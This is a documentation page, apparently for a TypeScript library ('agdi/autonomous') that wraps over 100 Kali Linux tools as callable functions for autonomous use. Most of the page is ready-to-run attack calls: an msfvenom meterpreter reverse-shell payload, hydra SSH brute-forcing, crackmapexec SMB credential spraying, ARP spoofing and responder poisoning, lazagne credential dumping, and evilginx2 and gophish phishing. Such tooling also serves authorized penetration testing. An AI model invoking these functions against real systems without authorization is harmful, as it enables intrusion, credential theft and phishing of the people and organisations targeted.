---
title: "Kali Linux Tools"
description: "Programmatic access to 100+ Kali Linux tools across 11 categories."
---

# Kali Linux Tools

AGDI wraps 100+ Kali Linux tools as callable TypeScript functions, organized into 11 categories.

## Categories

### 🔍 Information Gathering

```typescript
import { InfoGathering } from "agdi/autonomous";

await InfoGathering.nmap("10.0.0.1", "-sV", "-O");
await InfoGathering.masscan("10.0.0.0/24", "1-65535", "10000");
await InfoGathering.theHarvester("target.com", "all");
await InfoGathering.amass("target.com");
await InfoGathering.sublister("target.com");
await InfoGathering.whois("target.com");
await InfoGathering.enum4linux("10.0.0.5");
await InfoGathering.snmpwalk("10.0.0.1");
await InfoGathering.wafw00f("https://target.com");
```

### 🛡️ Vulnerability Analysis

```typescript
import { VulnAnalysis } from "agdi/autonomous";

await VulnAnalysis.nikto("https://target.com");
await VulnAnalysis.wpscan("https://wordpress-site.com");
await VulnAnalysis.nmapVuln("10.0.0.5");
await VulnAnalysis.lynis();
```

### 🕷️ Web Application Attacks

```typescript
import { WebAttacks } from "agdi/autonomous";

await WebAttacks.sqlmap("https://target.com/page?id=1", "--dbs");
await WebAttacks.gobuster("https://target.com", "/usr/share/wordlists/dirb/big.txt");
await WebAttacks.ffuf("https://target.com", "/usr/share/seclists/Discovery/Web-Content/common.txt");
await WebAttacks.whatweb("https://target.com");
await WebAttacks.sslyze("target.com");
```

### 🔑 Password Attacks

```typescript
import { PasswordAttacks } from "agdi/autonomous";

await PasswordAttacks.hydra("10.0.0.5", "ssh", "users.txt", "rockyou.txt");
await PasswordAttacks.hashcat("hash", "0", "rockyou.txt");
await PasswordAttacks.john("hashes.txt");
await PasswordAttacks.cewl("https://target.com");
```

### 📶 Wireless Attacks

```typescript
import { WirelessAttacks } from "agdi/autonomous";

await WirelessAttacks.airmonNg("start", "wlan0");
await WirelessAttacks.airodumpNg("wlan0mon");
await WirelessAttacks.wifite();
await WirelessAttacks.bettercap("-iface", "wlan0mon");
```

### 💣 Exploitation

```typescript
import { Exploitation } from "agdi/autonomous";

await Exploitation.msfconsole("exploit.rc");
await Exploitation.msfvenom("-p", "linux/x64/meterpreter/reverse_tcp", "LHOST=10.0.0.1", "LPORT=4444", "-f", "elf", "-o", "payload");
await Exploitation.searchsploit("apache 2.4");
await Exploitation.crackmapexec("smb", "10.0.0.0/24", "-u", "admin", "-p", "password");
```

### 📡 Sniffing & Spoofing

```typescript
import { SniffSpoof } from "agdi/autonomous";

await SniffSpoof.tcpdump("eth0", "port 80");
await SniffSpoof.tshark("eth0", "-Y", "http");
await SniffSpoof.arpspoof("eth0", "10.0.0.5", "10.0.0.1");
await SniffSpoof.responder("eth0");
await SniffSpoof.mitmproxy("8080");
await SniffSpoof.macchanger("eth0", "-r");
```

### 🏴‍☠️ Post-Exploitation

```typescript
import { PostExploitation } from "agdi/autonomous";

await PostExploitation.linpeas();
await PostExploitation.lazagne();
await PostExploitation.proxychains("nmap", "-sT", "10.0.0.5");
```

### 🔬 Forensics

```typescript
import { Forensics } from "agdi/autonomous";

await Forensics.binwalk("firmware.bin");
await Forensics.exiftool("image.jpg");
await Forensics.steghide("image.jpg", "password");
await Forensics.volatility("memory.dmp", "Win10x64", "pslist");
```

### ⚙️ Reverse Engineering

```typescript
import { ReverseEngineering } from "agdi/autonomous";

await ReverseEngineering.radare2("binary", "aaa", "afl");
await ReverseEngineering.objdump("binary");
await ReverseEngineering.apktool("app.apk");
await ReverseEngineering.jadx("app.apk");
```

### 🎭 Social Engineering

```typescript
import { SocialEngineering } from "agdi/autonomous";

await SocialEngineering.gophish();
await SocialEngineering.evilginx2();
```

## Audit Your Arsenal

```typescript
import { auditKaliTools } from "agdi/autonomous";

const audit = await auditKaliTools();
console.log(`✅ ${audit.installed.length}/${audit.total} tools installed`);
console.log("❌ Missing:", audit.missing.join(", "));
```

## Run Any Tool Directly

```typescript
import { runTool } from "agdi/autonomous";

const result = await runTool("nmap", ["-sV", "-p", "80,443", "10.0.0.1"]);
console.log(result.stdout);
```
